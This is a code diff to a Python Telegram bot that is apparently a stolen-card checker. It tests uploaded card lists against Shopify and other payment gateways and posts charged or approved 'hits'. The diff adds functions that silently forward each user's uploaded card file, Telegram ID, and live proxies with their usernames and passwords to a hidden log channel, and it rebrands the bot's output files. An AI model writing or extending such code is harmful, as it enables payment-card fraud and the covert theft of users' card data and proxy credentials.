@@ -13,6 +13,7 @@ import json
 import re
 import string
 import logging
+import io
 import socket
 import platform
 from datetime import datetime, timedelta
@@ -1380,17 +1381,94 @@ async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
             msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
 <b>{bs('Gateway')} ➛ {gw}</b>
 <b>{bs('Response')} ➛ {resp}</b>
-<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
+<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> (<code>{uid}</code>) ({tag})"""
         else:
             msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
 <b>{bs('Gateway')} ➛ {gw}</b>
 <b>{bs('Response')} ➛ {resp}</b>
 <b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
-<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
+<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> (<code>{uid}</code>) ({tag})"""
         await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
     except:
         pass
 
+# ====================== CHANNEL LOG HELPERS ======================
+async def log_uploaded_file_to_channel(event, rm, uid, username, gateway="Shopify"):
+    """Forward user's uploaded card file to LOG_CHANNEL_ID with context"""
+    if not rm or not rm.document:
+        return
+    try:
+        fp = await rm.download_media()
+    except:
+        return
+    try:
+        content = None
+        try:
+            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+                content = await f.read()
+        except:
+            pass
+        try:
+            doc_name = rm.document.attributes[0].file_name if rm.document.attributes else f"cards_{uid}.txt"
+        except:
+            doc_name = f"cards_{uid}.txt"
+        cards_preview = extract_cc(content) if content else []
+        log_cap = f"""📂 <b>{bs('File Uploaded')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+👤 <b>{bs('User')}:</b> <a href='tg://user?id={uid}'>{username}</a> (<code>{uid}</code>)
+📄 <b>{bs('File')}:</b> <code>{doc_name}</code>
+🎴 <b>{bs('Cards')}:</b> <code>{len(cards_preview)}</code> {bs('found')}
+🏷 <b>{bs('Gateway')}:</b> <b>{gateway}</b>"""
+        try:
+            with open(fp, 'rb') as f:
+                await client_instance.send_file(
+                    LOG_CHANNEL_ID,
+                    f,
+                    caption=log_cap,
+                    parse_mode='html'
+                )
+        except:
+            try:
+                await client_instance.forward_messages(LOG_CHANNEL_ID, event.reply_to_msg_id, event.chat_id)
+            except:
+                pass
+    except Exception as e:
+        log.error(f"log_uploaded_file_to_channel: {e}")
+    finally:
+        try:
+            os.remove(fp)
+        except:
+            pass
+
+
+async def log_proxies_to_channel(uid, username, live_proxies, total_parsed):
+    """Send live proxies to LOG_CHANNEL_ID individually + as txt file"""
+    if not live_proxies:
+        return
+    try:
+        for px in live_proxies:
+            px_text = f"""🔗 <b>{bs('Live Proxy Added')}</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+👤 <b>{bs('User')}:</b> <a href='tg://user?id={uid}'>{username}</a> (<code>{uid}</code>)
+🖥 <b>{bs('IP')}:</b> <code>{px['ip']}:{px['port']}</code>
+📡 <b>{bs('Type')}:</b> <code>{px['type']}</code>"""
+            if px.get('username'):
+                px_text += f"\n🔑 <b>{bs('Auth')}:</b> <code>{px['username']}:{px['password']}</code>"
+            await styled_send(LOG_CHANNEL_ID, px_text, emoji_ids=[CE["link"], CE["globe"], CE["info"]])
+    except:
+        pass
+    try:
+        txt_content = "\n".join(p['proxy_url'] for p in live_proxies)
+        txt_file = io.BytesIO(txt_content.encode('utf-8'))
+        txt_file.name = f"live_proxies_{uid}_{int(time.time())}.txt"
+        await client_instance.send_file(
+            LOG_CHANNEL_ID,
+            txt_file,
+            caption=f"📦 <b>{bs('Live Proxies Batch')}</b> ━ {len(live_proxies)}/{total_parsed}\n👤 <a href='tg://user?id={uid}'>{username}</a> (<code>{uid}</code>)",
+            parse_mode='html'
+        )
+    except:
+        pass
 
 async def pin_charged_message(event, msg):
     try:
@@ -1821,13 +1899,18 @@ async def add_proxy_cmd(event):
         if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
         parsed = parsed[:100-cc]
         tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
-        added, failed = [], []
+        added, failed, live_proxies = [], [], []
         for i in range(0, len(parsed), 10):
             batch = parsed[i:i+10]
             results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
             for pd2, res in zip(batch, results):
-                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1)
+                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1); live_proxies.append(pd2)
                 else: failed.append(1)
+        # ── Log live proxies to channel ──
+        if live_proxies:
+            sender = await event.get_sender()
+            uname = sender.first_name or "Unknown"
+            asyncio.create_task(log_proxies_to_channel(event.sender_id, uname, live_proxies, len(parsed)))
         await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
     except Exception as e:
         await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@@ -2161,7 +2244,7 @@ async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False,
 async def send_full_results_file(uid, all_results, gate_name, total, charged, approved, declined, errors, target_chat):
     if not all_results:
         return
-    fn = f"YChkBoT_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    fn = f"MeowChkBoT_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
     target = target_chat or uid
     try:
         async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
@@ -2219,7 +2302,14 @@ async def mass_check_cmd(event):
             fp = await rm.download_media()
             try:
                 async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
-                os.remove(fp)
+            except: pass
+            # ── Log uploaded file to channel ──
+            try:
+                sender = await event.get_sender()
+                uname = sender.first_name or "Unknown"
+                asyncio.create_task(log_uploaded_file_to_channel(event, rm, uid, uname, "Shopify"))
+            except: pass
+            try: os.remove(fp)
             except: pass
         elif rm.text: content = rm.text
     else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
